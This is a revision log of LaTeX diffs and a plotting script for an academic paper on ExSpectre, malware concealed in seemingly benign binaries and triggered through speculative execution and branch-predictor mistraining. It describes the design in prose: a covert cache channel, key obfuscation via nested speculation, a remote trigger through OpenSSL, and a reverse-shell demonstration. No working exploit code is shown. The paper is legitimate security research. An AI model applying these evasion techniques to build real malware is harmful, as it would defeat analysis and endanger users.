+\keywords{Malware; Covert Channel; Weird Machines; Spectre} % TODO: replace with your keywords
 

### 2018-05-09 paper/abstract.tex

@@
 
-We introduce \emph{\speculake}, which compiles arbitrary malicious code into a
-seemingly-benign payload binary. When a separate trigger program runs on the same
-machine, it mistrains the CPU's branch predictor, causing the payload program to
-\emph{speculatively} execute code, and communicating its results back to the
-rest of the payload program, changing its behavior.
+We introduce \emph{\speculake}\footnote{Executable Spectre}, which compiles
+arbitrary malicious code into a seemingly-benign payload binary. When a separate
+trigger program runs on the same machine, it mistrains the CPU's branch
+predictor, causing the payload program to \emph{speculatively} execute code, and
+communicating its results back to the rest of the payload program, changing its
+behavior.
 

### 2018-05-09 paper/architecture.tex
new graph and typos

@@
 the \emph{speculative entry point}. \speculake uses indirect jumps to allow
-speculatively executing from \emph{any} instruction in the payload process'
+speculative execution from \emph{any} instruction in the payload process'
 address space. Because it can jump to any instruction, the malware analyst has a
@@
 
-In fact, the location this entry point is not determined by the payload
+In fact, the location of this entry point is not determined by the payload
 program, but rather the corresponding trigger program. This means that with only

### 2018-05-09 paper/figures.tex
new graph and typos

@@
 
-    \caption{The number of instructions and success rate of a the 5-state Busy 
-    Beaver configuration were measured as a function of how many iterations 
-    into the speculative world were performed. We see that the amount of time 
-    to reach 20,000 instructions completed is a linear function of how many 
+    \caption{The number of instructions and error rate of a the 5-state Busy
+    Beaver configuration were measured as a function of how many iterations into
+    the speculative world were performed. We see that the amount of time to
+    reach a million instructions completed is a linear function of how many
     indirect calls into the speculative world we take. Additionally we see that
-    it only requires using 4 speculative calls to achieve no errors in reaching 
-    20,000 instructions.}
+    it only requires using 10 speculative calls per instruction to achieve a
+    very low number of errors in reaching a million instructions.}
 

### 2018-05-09 paper/related-work.tex
target fn translated to speculative gadget
related work pass

--- 2018-05-07 paper/related-work.tex
@@
 \subsection{Weird Machines \& Red-Pills}
-Hardware side effects often leave behind unexpected state transitions 
-that are not, or cannot be, accounted for in modeling environments. Malware
-has historically made use of these bugs to create "weird" models of 
-computation~\cite{weird_machines}. These state transitions can also leak 
-information about the environment in which a program is running, which 
-malware has used to detect honey-pots and emulated 
-environments~\cite{balzarotti2010efficient}.
+
+%Hardware side effects often leave behind unexpected state transitions 
+%that are not, or cannot be, accounted for in modeling environments. Malware
+%has historically made use of these bugs to create "weird" models of 
+%computation~\cite{weird_machines}. These state transitions can also leak 
+%information about the environment in which a program is running, which 
+%malware has used to detect honey-pots and emulated 
+%environments~\cite{balzarotti2010efficient}.
 
@@
 composing bugs and features of a system to create arbitrary compuatation with
-interesting properties~\cite{weird_machines,bratus2011exploit}. This 
+interesting properties~\cite{weird_machines,bratus2011exploit,weird_exploits}. This 
 encompasses many traditional computer vulnerabilities including 
-buffer overflow~\cite{buffer_overflow}, format string exploits~\cite{format_string_exploit}, 
-and return oriented programming~\cite{shacham2007geometry} to name only a few.
+buffer overflows~\cite{buffer_overflow}, format string exploits~\cite{format_string_exploit},
+and return oriented programming~\cite{shacham2007geometry}. These exploits
+demonstrate performing arbitrary computation in places that were not originally
+intended to act as computational entities.
 
-Bangert~\textit{et al.} demonstrate that a turing complete weird machine 
+As another example, Bangert~\textit{et al.} demonstrate that a turing complete weird machine 
 can be constructed using the page fault handling mechanism in Intel's
-IA32 architecture~\cite{bangert2013page}. Bugs like this are abundant in
-modern processors~\cite{d2015exploiting} as multiple threads share system resources cooperatively
-and optimizations is done objectively with regards of the 
-process isolation for the most part~\footnote{With the exception of permission 
-rings, i.e. kernel vs user space isolation}. Accessing cooperative hardware resources is at
-the heart of the \speculake model, which constructs a hardware weird machine
-using speculative branching and \texttt{Flush+Reload}. This is 
-very much in the spirit of traditional exploit creation~\cite{weird_exploits}.
+IA32 architecture~\cite{bangert2013page}.
+
+Unexpected functionality like this is abundant in modern
+processors~\cite{d2015exploiting} as multiple threads share system resources
+cooperatively and optimizations are often done across the process
+isolation boundary. \speculake takes advantage of cooperative hardware
+resources, and constructs a hardware weird machine
+using speculative branching and \texttt{Flush+Reload}.
 
@@
 
-Similarly hardware bugs have been used to identify and fingerprint execution
-environments -- in malware this is know as a red-pill~\cite{red-pill} and 
-is typically used to ensure that malware is not being emulated or 
-debugged~\cite{lindorfer2011detecting, balzarotti2010efficient}. Paleari 
-\textit{et al.} automate the process of discovering red-pills by applying 
-fuzzing techniques to emulated environments and identifying situations 
-in which the emulators differ from their physical counterparts~\cite{paleari2009fistful}.
-This is still by no means an exhaustive list of red-pills for a given 
-processor as many rely on timing or race conditions in physical 
-environments.
+Hardware minutia have also been used to identify and fingerprint execution
+environments --- in malware this is know as a red-pill~\cite{red-pill} and 
+is typically used by malware to detect when it is under emulation or
+a debugging environment~\cite{lindorfer2011detecting, balzarotti2010efficient}. Paleari
+\textit{et al.} automate the process of discovering red-pills by
+fuzzing emulated and physical environments and identifying
+differences between the two~\cite{paleari2009fistful}.
+%This is still by no means an exhaustive list of red-pills for a given 
+%processor as many rely on timing or race conditions in physical 
+%environments.
 
 % Hardware bare-metal analysis
-To combat this Kirat \textit{et al.} propose automated "bare-metal" 
+To combat this Kirat~\textit{et al.} propose automated ``bare-metal''
 emulation of malware~\cite{kirat2011barebox}, and methods to determine if malware
 is performing red-pill checks to avoid emulation environments~\cite{kirat2014barecloud}.
-Symbolic execution can also be used to combad red-pills by finding environmental triggers 
+Symbolic execution can also be used to combat red-pills by finding environmental triggers 
 in malicious binaries~\cite{schwartz2010all}.
@@
 Unlike other red-pills based on hardware bugs, \speculake cannot be bypassed
-by patching binaries as the speculation can only happen on "bare-metal" systems, 
+by patching binaries as the speculation will only occur on bare-metal systems, 
 and the critical functionality is performed speculatively. Similarly, debugging 
-break-points wll not be triggered as instructions are never completed in a committed state.
-Symbolic execution will also fail to find a target function as it is never on the 
+break-points will not be triggered as instructions are never completed in a committed state.
+Symbolic execution will also fail to find the speculative gadgets as it is never on the
 execution pathway.
@@
 
-Most cache side-channles fall into one of the following categories, although
-some implement variations on these models.
+Cache side channels come in many
+variants~\cite{neve2006refined,tromer2010efficient,yarom2014flush+,gruss2016flush+flush}.
+In \speculake, we utilize the \texttt{Flush+Reload} method, where we first flush
+all items from cache, wait for the speculative world to reload a value, and then
+time accesses to reloading each potential value. However, we acknowledge that
+the recent \texttt{Flush+Flush} variant may offer a
+faster alternative~\cite{gruss2016flush+flush}.
 
-\begin{itemize}
-\item \texttt{Evict+Time} - An attacker with a synchronized clock evicts a series of items 
-from cache. The victim then proceeds with computation, at which point the attacker can 
-time accesses to each evicted item to identify which items a victim loaded~\cite{neve2006refined}. 
-\item \texttt{Prime+Probe} - An attaker performs a computation, then evicts specific 
-items from the cache before performing the same action again. Information about the cache
-access patterns can be gained by comparing the timimg of the two 
-computations~\cite{tromer2010efficient}.
-\item \texttt{Flush+Reload} - Two cooperating processes  make use of the \texttt{Evict+Time} 
-model to form a communication channel~\cite{yarom2014flush+}.
-\item \texttt{Flush+Flush} - Follows the same model as \texttt{Prime+Probe},
-however clflush is used instead of a load as it resolves much quicker in cases 
-where the item is not in cache~\cite{gruss2016flush+flush}.
-\end{itemize}
+%\begin{itemize}
+%\item \texttt{Evict+Time} - An attacker with a synchronized clock evicts a series of items 
+%from cache. The victim then proceeds with computation, at which point the attacker can 
+%time accesses to each evicted item to identify which items a victim loaded~\cite{neve2006refined}. 
+%\item \texttt{Prime+Probe} - An attaker performs a computation, then evicts specific 
+%items from the cache before performing the same action again. Information about the cache
+%access patterns can be gained by comparing the timimg of the two 
+%computations~\cite{tromer2010efficient}.
+%\item \texttt{Flush+Reload} - Two cooperating processes  make use of the \texttt{Evict+Time} 
+%model to form a communication channel~\cite{yarom2014flush+}.
+%\item \texttt{Flush+Flush} - Follows the same model as \texttt{Prime+Probe},
+%however clflush is used instead of a load as it resolves much quicker in cases 
+%where the item is not in cache~\cite{gruss2016flush+flush}.
+%\end{itemize}
 
-While other works have demonstrated higher throughput from similar 
-covert cache side channels~\cite{liu2015last}, \speculake incurrs slightly higher performance 
-penalties in our implementation as we perform redundancy checks to 
-ensure the signal strength.  This redundancy combined with the intentional cache misseses
-which enable speculative execution cost hundreds to thousands of clock cycles
-per round.
+%While other works have demonstrated higher throughput from similar 
+%covert cache side channels~\cite{liu2015last}, \speculake incurrs slightly higher performance 
+%penalties in our implementation as we perform redundancy checks to 
+%ensure the signal strength.  This redundancy combined with the intentional cache misseses
+%which enable speculative execution cost hundreds to thousands of clock cycles
+%per round.
 
@@
 multiple teams were working to reverse engineer the mechanisms that implemented in 
-the microcode of various processors and document their behavior~\cite{intel-instruction-tables, uop_article}.
-Efforts to examine cache and memory security also preempted the spectre work, 
-including Sophia D'Antoine's thesis work developing a side channel based on 
-instruction interleavings in the CPU~\cite{d2015exploiting}. Similar research into branch 
-predictors, cache replacement policies, and reorder buffer construction including work by Matt 
-Godbolt~\cite{godbolt2016branch}, and Henry Wong~\cite{measuring-rob} paved the runway for 
-dedicated branch prodiction side-channels.
+the microcode of various processors and document their
+behavior~\cite{intel-instruction-tables,project_zero,measuring-cache,measuring-rob}.
+Research into branch predictors~\cite{godbolt2016branch}, cache replacement
+policies, and reorder buffer construction~\cite{measuring-rob} paved the way for
+the branch prediction side-channels employed by Spectre (and subsequently
+\speculake).
+%Efforts to examine cache and memory security also preempted the Spectre work, 
+%including Sophia D'Antoine's thesis work developing a side channel based on 
+%instruction interleaving in the CPU~\cite{d2015exploiting}. Similar research into branch 
+%predictors, cache replacement policies, and reorder buffer construction including work by Matt 
+%Godbolt~\cite{godbolt2016branch}, and Henry Wong~\cite{measuring-rob} paved the runway for 
+%dedicated branch prodiction side-channels.
 
@@
 Given the numerous directions that were being investigated in reverse engineering 
-Intel processors, multiple teams discovered the Spectre vulnerabilites concurrently including 
+Intel processors, multiple teams discovered the Spectre vulnerabilities concurrently including 
 the teams associated with Kocher \textit{et al.}~\cite{spectre}, the Project Zero team 
 at Google~\cite{project_zero},and various others~\cite{evtyushkin2018branchscope,maisuradze2018speculose}. 
-These works propose multiple variants making use of banch prediction.  Follow 
-up work on speculative execution side channels have also demonstrated
+%These works propose multiple variants making use of branch prediction.
+Follow 
+up work on speculative execution side channels has also demonstrated
 web-based vulnerabilites~\cite{genkin2018drive} as well as hardware isolation  
-leaks in Intel's SGX~\cite{spectre_sgx}.
+leaks in Intel's SGX~\cite{spectre_sgx}. At the time of writing multiple sources
+have claimed new speculative execution related exploits termed \textit{Spectre-NG}
+have been reported to Intel and assigned CVE numbers, though details are
+not yet available~\cite{spectre_ng_gossip}.
+%We have no details
+%on content, though Intel has labeled four as critical and another four 
+%as intermediate security flaws~\cite{spectre_ng_gossip}.
 
 % defenses
-Much like cache side channel vulnerabilities speculative execution is relatively
-critical to processor performance and requires significant software, and hardware 
-updates to fully address. Multiple measures have been proposed to combat the 
-individial variants of Spectre.
 
-The main defenses that have been widely applied to 
-speculative branching attacks uses compiler level software patches to wrap sensitive 
-function calls. Retpoline is Google's in house fix for enforcing 
-isolation against branch target injection attacks~\cite{retpoline}. By crafting 
-the stack around a sensitive function to trap into a pause instruction if the processor 
-attempts to speculate past the wrapper data side-effects can be protected against. 
-Similarly, Gruss \textit{et al.} propose the KAISER software patch to enforce address space
+%Much like cache side channel vulnerabilities speculative execution is relatively
+%critical to processor performance and requires significant software and hardware 
+%updates to fully address. 
+Multiple measures have been proposed to combat the 
+individual variants of Spectre.
+
+One popular approach uses compiler level software patches to wrap sensitive 
+function calls. Retpoline replaces indirect jumps with \texttt{retq}
+instructions that read from the cached stack (and are thus less likely to be
+mis-speculated)~\cite{retpoline}.
+Gruss~\textit{et al.} propose the KAISER software patch to enforce address space
 isolation for kernel and user space proceses~\cite{gruss2017kaslr}. 
@@
 fundamentally defeat the use of a branch predictor as a cooperative mechanism
-spanning multiple processes.
+spanning multiple processes. Intel has released microarchitecture updates for
+its most recent CPUs, but older architectures do not support these updates and
+will remain vulnerable~\cite{intel-micro-patch}.
 
-Trippel \textit{et al.} proposes a method of faithfully simulating 
-hardware bugs, such as processes cooperatively using speculating branch prediction,
-by synthesizing microarchetecture defects~\cite{trippel2018meltdownprime}. However, 
-manufacturers generally guard complete formal descriptions of processor microarchitecture closely, 
-making this a less accessible solution for the research community.
+Trippel~\textit{et al.} proposes a method of faithfully simulating hardware
+bugs, given a formal model specifying the
+microarchitecture~\cite{trippel2018meltdownprime}. However, such models are
+unlikely to be released by CPU manufacturers, as they generally involve
+closely-guarded trade secrets, making this a less accessible solution for the
+research community.
 
-\smallskip
-
-We can certainly look forward to more vulnerabilities relating to speculative 
-branching and related hardware side channels. Our work represents an exploit 
-model for these vulnerabilities reliant upon shared hardware resources.
+%\smallskip
+%
+%We can certainly look forward to more vulnerabilities relating to speculative 
+%branching and related hardware side channels. Our work represents an exploit 
+%model for these vulnerabilities reliant upon shared hardware resources.
 

### 2018-05-09 paper/implementation.tex

@@
 system call to open a shell.
-In our tests using 256 iterations per decrypted instruction, the
-\textit{ReverseShell} program takes under 7 seconds to launch a reverse shell
+In our tests using 5 iterations per decrypted instruction, the
+\textit{ReverseShell} program takes just over 2ms to launch a reverse shell
 once triggered.

### 2018-05-09 paper/architecture.tex
typo

@@
 branch predictors are proprietary, it is possible to reverse engineer parts of
-their behavior, which we do in \speculake.
+their behavior, which we do for \speculake.
 

### 2018-05-09 paper/figures.tex
edit fig cap

--- 2018-05-09 paper/figures.tex
@@
 
-    \caption{The number of instructions and success rate of a the 5-state Busy 
-    Beaver configuration were measured as a function of how many iterations 
-    into the speculative world were performed. We see that the amount of time 
-    to reach 20,000 instructions completed is a linear function of how many 
+    \caption{The number of instructions and error rate of a the 5-state Busy
+            Beaver configuration were measured as a function of how many (redundant) iterations into
+    the speculative world were performed. As expected, the amount of time to
+    complete a million instructions is a linear function of how many
     indirect calls into the speculative world we take. Additionally we see that
-    it only requires using 4 speculative calls to achieve no errors in reaching 
-    20,000 instructions.}
+    it only requires using 10 speculative calls per instruction to achieve a
+    very low number of errors in reaching a million instructions, making 10-20
+    iterations an attractive choice for most applications.}
 

### 2018-05-09 paper/figures.tex
specify iterations in bandwidth figure

--- 2018-05-09 paper/figures.tex
@@
         1KB of data can be decrypted and exfiltrated at a speed between 5 and 6 kbps
-        from the speculative world. Varying the width of the channel 
+        from the speculative world with 20 iterations per
+        round for guaranteed correctness.  Varying the width of the channel 
         results in competing performance factors -- decreasing the 

### 2018-05-09 paper/abstract.tex
abstract nits

@@
 
-We study the extent and types of execution that can be performed in the
-``speculative world'', and build tools that enable several computations to be
+We study the extent and types of execution that can be performed
+speculatively, and build tools that enable several computations to be
 performed covertly. In particular, within speculative execution we are able to
@@
 \speculake demonstrates a new kind of malware that evades existing reverse
-engineering and binary analysis techniques. Because its true functionality can be
+engineering and binary analysis techniques. Because its true functionality is
 contained in seemingly unreachable dead code, and its control flow driven
-externally by any other program running at the same time, \speculake poses a
+externally by potentially any other program running at the same time, \speculake poses a
 novel threat to state-of-the-art malware analysis techniques.

### 2018-05-09 paper/figures.tex
implementation pass

@@
         \includegraphics[width=0.5\textwidth]{figures/Speculative_bandwidth}
-    \caption{Speculative Bandwidth---Using the speculative primitive 
-        1KB of data can be decrypted and exfiltrated at a speed between 5 and 6 kbps
-        from the speculative world with 20 iterations per
-        round for guaranteed correctness.  Varying the width of the channel 
-        results in competing performance factors -- decreasing the 
-        number of loops vs decreased size of the probe space.}
+    \caption{Speculative Bandwidth---Using the speculative primitive 1KB of data
+        can be decrypted and exfiltrated at a speed between 5 and 6 kbps from
+        the speculative world with 20 iterations per round for guaranteed
+        correctness.  Varying the width of the channel results in competing
+        performance factors -- decreasing the number of loops vs decreased size
+        of the probe space.}
     \label{fig:spec_bandwidth}
@@
         \includegraphics[width=0.46\textwidth]{figures/spasm_model.pdf}
-    \caption{This diagram demonstrates the control flow of a \speculake application
-        making use of the decryption gadget and emulation. An encrypted SPASM binary 
-        stored in dead code or data accessible to \textit{Speculative Computation} 
-        is decrypted  and then returned through the primitive. The 
-        \textit{Resultant Computation} performs the SPASM emulation to update the 
-        process state before the next instruction is decrypted.}
+    \caption{This diagram demonstrates the control flow of a \speculake
+        application making use of the decryption gadget and emulation. An
+        encrypted SPASM binary stored in dead code or data accessible to
+        \textit{Speculative Computation} is decrypted  and then returned through
+        the primitive. The \textit{Resultant Computation} performs the SPASM
+        emulation to update the process state before the next instruction is
+        decrypted.}
     \label{fig:spasm_model}
@@
     \caption{The number of instructions and error rate of a the 5-state Busy
-            Beaver configuration were measured as a function of how many (redundant) iterations into
-    the speculative world were performed. As expected, the amount of time to
-    complete a million instructions is a linear function of how many
-    indirect calls into the speculative world we take. Additionally we see that
-    it only requires using 10 speculative calls per instruction to achieve a
-    very low number of errors in reaching a million instructions, making 10-20
-    iterations an attractive choice for most applications.}
+            Beaver configuration were measured as a function of how many
+            (redundant) iterations into the speculative world were performed. As
+            expected, the amount of time to complete a million instructions is a
+            linear function of how many indirect calls into the speculative
+            world we take. Additionally we see that it only requires using 10
+            speculative calls per instruction to achieve a very low number of
+            errors in reaching a million instructions, making 10-20 iterations
+            an attractive choice for most applications.}
 

### 2018-05-09 paper/implementation.tex
implementation pass

@@
 
-Our Turing implementation discovered that 4 repetitions is sufficient for the
+Our Turing implementation discovered that 10 repetitions is sufficient for the
 real world to determine the correct value, as the ``hit rate'' for any one
@@
 We implemented the 5 state Busy Beaver configuration which requires over 47
-million steps to complete. We were able to verify that the speculative world
-could correctly compute 20 thousand steps with no errors at a rate of 324
-instructions per second.
+million steps to complete. Figure~\ref{fig:turing_success} shows the
+capabilities of our Turing implementation. We were able to verify that the
+speculative world could correctly compute a million instructions with no errors
+at a rate of 324 instructions per second.
 
@@
 We demonstrate the speed that information can be decrypted via the speculative
-world, and we vary the channel width of the side channel from 1 to 12 bit to
+world, and we vary the channel width of the side channel from 1 to 12 bits to
 measure its performance. At low channel width, reading from the cache side
 channel requires timing reads from only 2 locations, while at 12-bits, the side
-channel requires reading $2^{12}$ locations. On the flip side, there is a fixed
+channel requires reading $2^{12}$ locations. On the other hand, there is a fixed
 overhead per iteration that favors increased channel width to maximize
@@
 before  duplicating I/O file descriptors and executing a local shell. Details of
-the SPASM instruction set can be found in Appendix~\ref{appendix:spasm}.
+the SPASM instruction set can be found in Appendix~\ref{appendix:spasm}. Figure~\ref{fig:spasm_model} details the high-level flow of a SPASM payload.
 
 Expected performance for a given SPASM binary will vary given multiple factors,
-the most important of which is the \texttt{Flush+Reload} redundancy. This can be tuned
-based on the specific trigger, as it is used to establish confidence that a signal 
-has been identified in the indicess returned from the "speculative world". 
+the most important of which is the \texttt{Flush+Reload} redundancy. This can be
+tuned based on the specific trigger, as it is used to establish confidence that
+a signal has been identified in the indices returned from the "speculative
+world". 
 %Thus accomplishing a task using SPASM generally equates to:

### 2018-05-09 turing/plots.py

@@ -30,10 +30,10 @@ with open(filename, "r") as f:
         means.append(mean)
         l = f.readline() # jump number
 
-means = [float(20000-i)/20000.0 for i in means]
-meds = [float(20000-i)/20000.0 for i in meds]
-mins = [float(20000-i)/20000.0 for i in mins]
-maxes = [float(20000-i)/20000.0 for i in maxes]
+means = [(10**6)*float(i)/100000.0 for i in means]
+meds = [(10**6)*float(i)/100000.0 for i in meds]
+mins = [(10**6)*float(i)/100000.0 for i in mins]
+maxes = [(10**6)*float(i)/100000.0 for i in maxes]
 
 # plt.plot(numJumps, mins, label="minimums")
 # plt.subplot()
@@ -53,8 +53,9 @@ fig, ax1 = plt.subplots()
 
 color = "tab:blue"
 ax1.set_xlabel("Number of iterations")
-ax1.set_ylabel("Average success rate over 20k instructions")
+ax1.set_ylabel("Average number of errors per one million instructions")
 ax1.plot(numJumps, means, label="Success rate", color=color, linewidth=3.0)
+ax1.set_ylim(0,30)
 ax1.tick_params(axis="y", labelcolor=color)
 
 # now plot hitrate
@@ -88,9 +89,11 @@ with open(filename, "r") as f:
         l = f.readline() # jump number
 
 ax2 = ax1.twinx()
+maxes = [10*i for i in maxes]
+means = [10*i for i in means]
 
 color = "tab:red"
-ax2.set_ylabel("Average time (s) to reach 20k instructions",color=color)
+ax2.set_ylabel("Average time (s) to reach 1 million instructions",color=color)
 ax2.plot(numJumps, means, color=color,label="Average time", linewidth=3.0)
 ax2.tick_params(axis="y", labelcolor=color)
 

### 2018-05-09 paper/discussion.tex
typos

@@
 
-Finally, \speculake could also use another side channel method besides that
+Finally, \speculake could also use another side channel method that
 avoids the cache
@@
 
-\texttt{Guest1 -> Guest1} - When both trigger and payload are run internal to
-a single virtual machine the branch prediction is successfully trained in the payload
-program, though at a notably reduced hit rate. This can be overcome by using an 
-increased number of iterations to establish confidence.
+\texttt{Guest1 -> Guest1}---When both trigger and payload are run internal to a
+single virtual machine the branch prediction is successfully trained in the
+payload program, though at a notably reduced hit rate. This can be overcome by
+using an increased number of iterations to establish confidence.
 
-\texttt{Guest -> Host} - In a configuration where trigger runs on the guest while the 
-payload runs on the host we have found that \speculake also successfully trains the 
-branch predictor well enough retreive a signal. Again, this signal is significantly
-reduced, implying the hypercall context swtich from guest to host requires some 
-overhead. We note that processor affinity in a guest is not mapped to processor 
-affinity in the host, as the host assigns the vm to any available CPU, though 
-eventually the hypervisor will assign the vm back to the same core as the payload 
-program allowing progress to continue.
+\texttt{Guest -> Host}---In a configuration where trigger runs on the guest
+while the payload runs on the host we have found that \speculake also
+successfully trains the branch predictor well enough retreive a signal. Again,
+this signal is significantly reduced, implying the hypercall context swtich from
+guest to host requires some overhead. We note that processor affinity in a guest
+is not mapped to processor affinity in the host, as the host assigns the VM to
+any available CPU, though eventually the hypervisor will assign the VM back to
+the same core as the payload program allowing progress to continue.
 
-\texttt{Host -> Guest} - When trigger runs on the host attempting to train the 
+\texttt{Host -> Guest}---When trigger runs on the host attempting to train the
 branch predictor to influence a payload process in a guest we have found that
@@
 This matches with work done by the Project Zero team at Google which found that
-hypervisors can be fingerprinted from within a vm using the branch 
+hypervisors can be fingerprinted from within a VM using the branch
 predictor~\cite{project_zero}.
 
-\texttt{Guest1 -> Guest2} - Configurations where trigger and payload 
-run on coresident virtual machines similarly show no signal for the same 
-reasons that host to guest \speculake fails. However, this has the added difficulty
-that virtual machines must be run on the same core or on a pair of 
-hyperthreaded cores.
+\texttt{Guest1 -> Guest2}---Configurations where trigger and payload run on
+co-resident virtual machines similarly show no signal for the same reasons that
+host to guest \speculake fails. However, this has the added difficulty that
+virtual machines must be run on the same core or on a pair of hyperthreaded
+cores.
 
@@
 the payload program, and write in data from a local, or (as demonstrated in
-section~\ref{subsec:openssl}) remote processes. For example, a payload program
+Section~\ref{subsec:openssl}) remote processes. For example, a payload program
 can check a series of three distinct jump patterns corresponding to three
@@
 \subsubsection{Benign Triggers}
-We have demonstrated that a using OpenSSL as a benign trigger allows for
+We have demonstrated that a using \allowbreak OpenSSL as a benign trigger allows for
 \speculake payloads to be triggered remotely, and discussed the minimum
@@
 juicy targets for trigger design. For exmaple, if a sufficient series of jumps
-is found to exist in the TCP stack implemented in the unix kernel (i.e. in the
+is found to exist in the TCP stack implemented in the UNIX kernel (i.e. in the
 TCP Checksum library) an attacker could reasonably trigger a \speculake payload
@@
 defeating KASLR, however, this has been demonstrated to be
-feasible~\cite{gruss2017kaslr,evtyushkin2016jump}
+feasible~\cite{gruss2017kaslr,evtyushkin2016jump}.
 

### 2018-05-09 paper/related-work.tex
typos

@@
 composing bugs and features of a system to create arbitrary compuatation with
-interesting properties~\cite{weird_machines,bratus2011exploit,weird_exploits}. This 
-encompasses many traditional computer vulnerabilities including 
-buffer overflows~\cite{buffer_overflow}, format string exploits~\cite{format_string_exploit},
-and return oriented programming~\cite{shacham2007geometry}. These exploits
-demonstrate performing arbitrary computation in places that were not originally
-intended to act as computational entities.
+interesting properties~\cite{weird_machines,bratus2011exploit,weird_exploits}.
+This encompasses many traditional computer vulnerabilities including buffer
+overflows~\cite{buffer_overflow}, format string
+exploits~\cite{format_string_exploit}, and return oriented
+programming~\cite{shacham2007geometry}. These exploits demonstrate performing
+arbitrary computation in places that were not originally intended to act as
+computational entities.
 
-As another example, Bangert~\textit{et al.} demonstrate that a turing complete weird machine 
-can be constructed using the page fault handling mechanism in Intel's
-IA32 architecture~\cite{bangert2013page}.
+As another example, Bangert~\textit{et al.} demonstrate that a Turing complete
+weird machine can be constructed using the page fault handling mechanism in
+Intel's IA32 architecture~\cite{bangert2013page}.
 
@@
 % Lead in 
-Leading up to the discovery and release of the Spectre and Meltdown vulnerabilities
-multiple teams were working to reverse engineer the mechanisms that implemented in 
-the microcode of various processors and document their
+Leading up to the discovery and release of the Spectre and Meltdown
+vulnerabilities multiple teams were working to reverse engineer the mechanisms
+that implemented in the microcode of various processors and document their
 behavior~\cite{intel-instruction-tables,project_zero,measuring-cache,measuring-rob}.
@@
 % Discovery & Followup
-Given the numerous directions that were being investigated in reverse engineering 
-Intel processors, multiple teams discovered the Spectre vulnerabilities concurrently including 
-the teams associated with Kocher \textit{et al.}~\cite{spectre}, the Project Zero team 
-at Google~\cite{project_zero},and various others~\cite{evtyushkin2018branchscope,maisuradze2018speculose}. 
+Given the numerous directions that were being investigated in reverse
+engineering Intel processors, multiple teams discovered the Spectre
+vulnerabilities concurrently including the teams associated with Kocher
+\textit{et al.}~\cite{spectre}, the Project Zero team at
+Google~\cite{project_zero}, and various
+others~\cite{evtyushkin2018branchscope,maisuradze2018speculose}. 
 %These works propose multiple variants making use of branch prediction.

### 2018-05-09 paper/architecture.tex
arch nit

@@
 ROB size and processor mechanisms for resolving
-data dependencies define an upper boundary.
+data dependencies define an upper boundary of approximately 150
+instructions\footnote{While \texttt{nop} is able to execute up to the full 220
+ROB capacity, instructions that do useful work cannot reach this limit}.
 

### 2018-05-10 paper/implementation.tex
add more detail on nested spec

@@
 could observe the structure of a normal key schedule,
-but we can avoid this by simply selecting 11 random round keys (and encrypting
-using the same 11 round keys). We discuss further methods for obfuscating
+but we can avoid this by simply selecting 11 random round keys.
+While this alternative key schedule variant is not ``true'' AES, we can easily
+make the same change in our respective encryption function to make it compatible.
+We note that
+this should not weaken the security of AES, as we can ensure the round keys are
+not linearly related.
+We discuss further methods for obfuscating
 the key in Section~\ref{subsec:nested-spec}.
@@
 channel requires reading $2^{12}$ locations. On the other hand, there is a fixed
-overhead per iteration that favors increased channel width to maximize
+overhead per speculative iteration that favors increased channel width to maximize
 bandwidth. As shown in Figure~\ref{fig:spec_bandwidth}, 8 bits is the optimal
@@
 Bytes/sec).
+% Iterations: 20
+
+\subsubsection{Obfuscating keys with nested speculation}
+\label{subsec:nested-spec}
+
+An analyst could locate the speculative entry point for our
+decryption gadget by
+searching for AES-NI instructions in the payload program's dead code, ultimately
+discovering the keys that it uses. However, we find it is possible to overcome
+this by having the trigger program communicate the decryption key to the payload
+program via the branch predictor.
+
+To accomplish this, we use multiple speculative entry points, each that derives a
+different decryption key before calling a common decryption routine. Since
+the exact speculative entry point is determined by the trigger program, an
+analyst cannot discover the decryption key directly from the payload program.
+
+An analyst could still enumerate all potential entry points, testing each one
+until they find one that correctly decrypts the ciphertext. In a 1~MB binary,
+there are (at most) only 1~million entry points, providing just 20~bits of
+security.
+
+To increase security, we instead use nested speculation to \emph{chain} entry points
+together. Rather than derive
+the key from a single entry point, we have each potential entry point perform
+another indirect jump that the CPU cannot immediately resolve, forcing it to
+speculate while already executing speculatively. The predicted target of that jump
+will also be determined by the trigger program. For example, if the trigger
+program makes 30 training jumps, followed by 10 additional indirect jumps, and
+the payload program performs the same 30 training jumps before a stall, the CPU
+will predict the payload program will also perform the next 10 jumps. If each
+jump has the potential to land in up to 1024 possible locations, this would
+provide in total $1024^{10} = 2^{100}$ possible keys, or 100~bits of security.
+%We describe our implementation of this nested speculative execution concept in
+%Section~\ref{subsec:nested-spec}.
+
+\smallskip
+
+We implemented this technique, making 256 speculative landing spots, that each
+shifted 8 unique bits into the 128-bit register \texttt{\%xmm0}, and then
+performed an indirect jump. We then had the trigger program perform 16
+indirect jumps that corresponded with 16 randomly-chosen landing spots in the
+payload program, training the branch predictor. When the payload program reaches the
+first speculative jump, it follows the same pattern speculatively, 
+eventually filling
+\texttt{\%xmm0} with the corresponding $16*8$ bits. We then used
+the \texttt{aesenc} instruction to expand these 128-bits to a full
+key schedule, and performed decryption as described previously.
 
@@
 
-\subsection{Nested Speculation}
-\label{subsec:nested-spec}
-
-We note that an analyst might attempt to locate the speculative entry point by
-searching for AES-NI instructions in the payload program's dead code, ultimately
-discovering the keys that it uses. However, we find it is possible to overcome
-this by having the trigger program communicate the decryption key to the payload
-program via the branch predictor.
-
-To accomplish this, we use multiple speculative entry points, each that derive a
-different decryption key before calling a common decryption routine. Since
-the exact speculative entry point is determined by the trigger program, an
-analyst cannot discover the decryption key directly from the payload program.
-
-An analyst could still enumerate all potential entry points, testing each one
-until they find one that correctly decrypts the ciphertext. In a 1~MB binary,
-there are (at most) only 1~million entry points, providing just 20~bits of
-security.
-
-To increase security, we \emph{chain} entry points together. Rather than derive
-the key from a single entry point, we have each potential entry point perform
-another indirect jump that the CPU cannot immediately resolve, forcing it to
-speculate while already executing speculatively. The predicted target of that jump
-will also be determined by the trigger program. For example, if the trigger
-program makes 30 training jumps, followed by 10 additional indirect jumps, and
-the payload program performs the same 30 training jumps before a stall, the CPU
-will predict the payload program will also perform the next 10 jumps. If each
-jump has the potential to land in up to 1024 possible locations, this would
-provide in total $1024^{10} = 2^{100}$ possible keys, or 100~bits of security.
-%We describe our implementation of this nested speculative execution concept in
-%Section~\ref{subsec:nested-spec}.
-
 %%%%%%%%%%%%%%

### 2018-05-10 paper/implementation.tex
openssl pass

@@
 the ECDHE shared secret. We made a list of 31 source-destination address pairs
-for these indirect jumps, and constructed a jump/ret chain at those addresses in
+for these indirect jumps, and constructed a jump/ret chain to mimic the same
+jump pattern in
